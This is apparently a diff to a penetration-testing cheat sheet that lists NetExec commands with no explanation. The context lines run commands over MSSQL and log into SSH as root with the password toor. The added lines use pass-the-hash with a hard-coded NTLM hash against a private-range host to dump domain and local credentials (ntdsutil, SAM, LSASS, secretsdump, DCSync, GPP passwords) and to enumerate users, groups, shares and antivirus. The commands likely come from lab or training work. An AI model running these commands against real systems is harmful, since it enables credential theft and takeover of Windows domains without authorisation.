@@ -20,3 +20,31 @@ netexec mssql 10.10.10.30 -u sa -p pass -x "whoami"
 
 netexec ssh 10.10.10.20 -u root -p toor
 
+netexec smb --list-modules
+
+netexec smb 172.16.119.11 -u stom -H 21ea958524cfd9a7791737f8d2f764fa -M ntdsutil
+netexec smb 172.16.119.11 -u stom -H 21ea958524cfd9a7791737f8d2f764fa -M sam
+netexec smb 172.16.119.11 -u stom -H 21ea958524cfd9a7791737f8d2f764fa -M lsassy
+netexec smb 172.16.119.11 -u stom -H 21ea958524cfd9a7791737f8d2f764fa -M system
+netexec smb 172.16.119.11 -u stom -H 21ea958524cfd9a7791737f8d2f764fa -M security
+netexec smb 172.16.119.11 -u stom -H 21ea958524cfd9a7791737f8d2f764fa -M secretsdump
+netexec smb 172.16.119.11 -u stom -H 21ea958524cfd9a7791737f8d2f764fa -M dcsync
+
+netexec smb 172.16.119.11 -u stom -H 21ea958524cfd9a7791737f8d2f764fa -M gpp_password
+netexec smb 172.16.119.11 -u stom -H 21ea958524cfd9a7791737f8d2f764fa -M spider_plus
+netexec smb 172.16.119.11 -u stom -H 21ea958524cfd9a7791737f8d2f764fa -M enum_av
+netexec smb 172.16.119.11 -u stom -H 21ea958524cfd9a7791737f8d2f764fa -M enum_dns
+netexec smb 172.16.119.11 -u stom -H 21ea958524cfd9a7791737f8d2f764fa -M enum_os
+netexec smb 172.16.119.11 -u stom -H 21ea958524cfd9a7791737f8d2f764fa -M enum_users
+netexec smb 172.16.119.11 -u stom -H 21ea958524cfd9a7791737f8d2f764fa -M enum_groups
+netexec smb 172.16.119.11 -u stom -H 21ea958524cfd9a7791737f8d2f764fa -M enum_loggedon_users
+netexec smb 172.16.119.11 -u stom -H 21ea958524cfd9a7791737f8d2f764fa -M enum_shares
+netexec smb 172.16.119.11 -u stom -H 21ea958524cfd9a7791737f8d2f764fa -M enum_password_policy
+netexec smb 172.16.119.11 -u stom -H 21ea958524cfd9a7791737f8d2f764fa -M spooler
+netexec smb 172.16.119.11 -u stom -H 21ea958524cfd9a7791737f8d2f764fa -M rdp
+netexec smb 172.16.119.11 -u stom -H 21ea958524cfd9a7791737f8d2f764fa -M winrm
+
+
+
+
+
